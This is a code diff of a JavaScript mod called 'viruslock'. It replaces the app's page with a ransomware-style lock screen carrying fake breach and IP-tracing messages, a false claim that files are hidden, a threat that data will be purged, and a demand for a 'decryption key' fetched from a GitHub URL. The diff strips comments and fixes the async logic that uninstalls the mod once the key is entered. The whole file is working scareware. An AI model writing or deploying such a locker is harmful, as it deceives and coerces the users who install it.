@@ -1,14 +1,11 @@
-iscoredetected = null;
+Iscoredetected = null;
 (async function() {
-    // 1. Konfigurasi URL GitHub
     const urlGithub = 'https://raw.githubusercontent.com/kenzz-sz/Zynx_mod/refs/heads/main/mods/viruslock/pin.txt';
     
-    // 2. Simpan data asli
     const originalContent = document.body.innerHTML;
     const originalStyle = document.body.style.cssText;
     const originalTitle = document.title;
 
-    // 3. Setup Lingkungan "Gelap"
     document.title = "FATAL ERROR: SYSTEM BREACHED";
     document.body.innerHTML = '';
     document.body.style.cssText = `
@@ -27,7 +24,6 @@ iscoredetected = null;
         text-shadow: 0 0 5px #ff0000;
     `;
 
-    // 4. Bangun UI yang lebih Dark & Kompleks
     const container = document.createElement('div');
     container.style.cssText = `
         text-align: left;
@@ -45,19 +41,15 @@ iscoredetected = null;
             UNAUTHORIZED ACCESS DETECTED: ${new Date().toLocaleString()}<br>
             IP_ADDRESS: TRACED_BY_DIZZZ
         </div>
-        
         <p style="font-size: 0.9rem; color: #ccc;">Your files are still there, but you can't see them. Input the decryption key to restore access.</p>
-        
         <div style="margin-top: 30px;">
             <input type="password" id="pinInput" placeholder="KEY_REQUIRED" autocomplete="off"
                 style="width: 100%; background: transparent; border: 1px solid #440000; color: #ff0000; padding: 12px; font-family: monospace; outline: none; box-sizing: border-box; transition: 0.3s; font-size: 1rem;">
-            
             <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 20px;">
                 <span id="pesan" style="font-size: 0.75rem; color: #ff0000; text-transform: uppercase;">Awaiting credentials...</span>
                 <button id="unlockBtn" style="background: transparent; border: 1px solid #ff0000; color: #ff0000; padding: 8px 25px; cursor: pointer; font-family: monospace; font-weight: bold; transition: 0.3s; text-transform: uppercase;">Restore</button>
             </div>
         </div>
-
         <div style="margin-top: 50px; font-size: 0.6rem; color: #440000; text-align: center;">
             DO NOT REFRESH THIS PAGE OR DATA WILL BE PURGED.
         </div>
@@ -65,12 +57,10 @@ iscoredetected = null;
 
     document.body.appendChild(container);
 
-    // Efek Hover Button (Tidak Lebay)
     const btn = document.getElementById('unlockBtn');
     btn.onmouseover = () => { btn.style.background = '#ff0000'; btn.style.color = '#000'; };
     btn.onmouseout = () => { btn.style.background = 'transparent'; btn.style.color = '#ff0000'; };
 
-    // 5. Logika Verifikasi
     async function verifyAccess() {
         const inputUser = document.getElementById('pinInput').value;
         const pesan = document.getElementById('pesan');
@@ -85,44 +75,48 @@ iscoredetected = null;
             const rawPin = await response.text();
             const pinBenar = rawPin.trim();
 
-            // Delay sedikit untuk efek "proses"
-            setTimeout(() => {
-                if (inputUser === pinBenar) {
-                    pesan.innerText = "> ACCESS_GRANTED";
-                    pesan.style.color = "#00ff00";
+            if (inputUser === pinBenar) {
+                pesan.innerText = "> ACCESS_GRANTED";
+                pesan.style.color = "#00ff00";
+                
+                // --- PROSES UNLOCK ---
+                // Menggunakan try-catch karena fh() dan installedmods mungkin tidak ada di lingkup global
+                try {
+                    const resFh = await fh("viruslockxDizz");
+                    const ayamaaa = JSON.parse(resFh);
+                    const dirTarget = ayamaaa.directory; // Hilangkan await jika directory hanya string
                     
-                    let ayamaaa = JSON.parse(await fh("viruslockxDizz"));
-                    
-                    installedmods = installedmods.filter(m => {m.directory !== await ayamaaa.directory})
-                    localStorage.setItem("mymods", JSON.stringify(installedmods))  
-                    // Efek Fade Out sebelum kembali ke asal
-                    container.style.transition = "opacity 1s";
-                    container.style.opacity = "0";
-                    
-                    setTimeout(() => {
-                        document.body.style.cssText = originalStyle;
-                        document.body.innerHTML = originalContent;
-                        document.title = originalTitle;
-                        console.clear();
-                        console.log("%c SYSTEM RESTORED ", "background: #00ff00; color: #000; font-weight: bold;");
-                    }, 1000);
-                } else {
-                    pesan.innerText = "> ERROR: WRONG_KEY";
-                    pesan.style.color = "#ff0000";
-                    document.getElementById('pinInput').value = '';
-                    // Efek shake singkat
-                    container.style.transform = "translateX(5px)";
-                    setTimeout(() => container.style.transform = "translateX(0)", 100);
+                    if (typeof installedmods !== 'undefined') {
+                        installedmods = installedmods.filter(m => m.directory !== dirTarget);
+                        localStorage.setItem("mymods", JSON.stringify(installedmods));
+                    }
+                } catch (e) {
+                    console.log("Mod removal skipped or failed.");
                 }
-            }, 800);
+
+                container.style.transition = "opacity 1s";
+                container.style.opacity = "0";
+                
+                setTimeout(() => {
+                    document.body.style.cssText = originalStyle;
+                    document.body.innerHTML = originalContent;
+                    document.title = originalTitle;
+                    console.clear();
+                }, 1000);
+            } else {
+                pesan.innerText = "> ERROR: WRONG_KEY";
+                pesan.style.color = "#ff0000";
+                document.getElementById('pinInput').value = '';
+                container.style.transform = "translateX(5px)";
+                setTimeout(() => container.style.transform = "translateX(0)", 100);
+            }
 
         } catch (error) {
             pesan.innerText = "> CONNECTION_FAILED";
-            console.error("Critical Error:", error);
+            console.error(error);
         }
     }
 
-    // Event Listeners
     btn.onclick = verifyAccess;
     document.getElementById('pinInput').addEventListener('keypress', (e) => {
         if (e.key === 'Enter') verifyAccess();
